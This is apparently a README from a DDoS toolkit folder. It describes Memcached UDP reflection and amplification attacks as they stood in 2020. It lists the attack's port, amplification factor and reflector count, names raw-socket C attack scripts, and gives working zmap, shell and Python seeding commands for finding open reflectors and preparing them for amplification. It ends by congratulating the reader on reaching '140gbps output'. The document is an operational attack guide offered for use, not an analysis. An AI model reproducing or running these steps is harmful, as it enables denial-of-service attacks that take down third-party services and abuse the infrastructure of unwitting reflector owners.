# MemcacheD (Active Q2 2020)

## Port: 11211

## Proto: UDP

## Amplification factor: 200x (Q2 2020 - using `memcached-static.c` script)

## Reflector count: 1,900 (Q2 2020)

---

Amplification scripts in this folder:

- **memcached-dynamic.c** - Dynamic key reflection query generator C script (raw sockets)
- **memcached-static.c** - Static key reflection template C socket script (raw sockets)

This folder holds all relevant scripts for Memcache amplification (in 2020) utilising either dynamic `<ip> <value>` mg/get/gets command to the effect of garnering the largest amplification factor per IP with the least amount of work (**see memcached-filter.py**); alternatively utilising static gets command to known memcache keys that are pre-seeded from a list file.

Memcache Daemon has thankfully been patched and most old and vulnerable devices have been removed from the internet following the [1.7tbps attack incident back in 2017](https://www.zdnet.com/article/new-world-record-ddos-attack-hits-1-7tbps-days-after-landmark-github-outage/) through efforts of the community at large.

### How does it work

- Using Python to dynamically seed MemcacheD devices that respond to "stats items" query, with bogus data to keys of length 1 that are then used by dynamic or static amplification scripts.
- Either dynamic script (scanned and filtered list of keys) or static script (pre-seeded keys) to generate amplification via raw sockets.

### How to use

#### First use zmap to scan for all reflectors responding to "stats items"

- `echo -ne '\x00\x01\x00\x00\x00\x01\x00\x00stats items\r\n'>memecached.pkt`
- `zmap -p11211 --output-filter='sport=11211' -Mudp --probe-args=file:memecached.pkt -f "saddr,udp_pkt_size,data" -o /root/memcached-live`

#### Filter list using this command (this removes bogus responses and cleans up the list)

- `cat /root/memcached-live | sed 's/,/ /g' | sed 's/saddr.*//g' | awk '$2 == 21 || $2 == 20 || $2 > 26' | awk '{print $1}' | uniq >memcached.list;wc -l memcached.list`

The list is now ready for seeding with the python script in this folder. You can now download the list `memcached.list` as this will be usable by the C scripts in this folder as well.

#### Run the seeding process

This just uses a junkfile to hold output which is erased at the start if it exists, thus you can paste the entire line in over and over to seed the IPs present in the `memcached.list` file!

- `rm junkfile;shuf memcached.list>shufflejunk;mv shufflejunk memcached.list;screen -dmS seeder python3 memecached-seeder.py memcached.list junkfile`

#### Congrats, 140gbps output with 600mbps input...
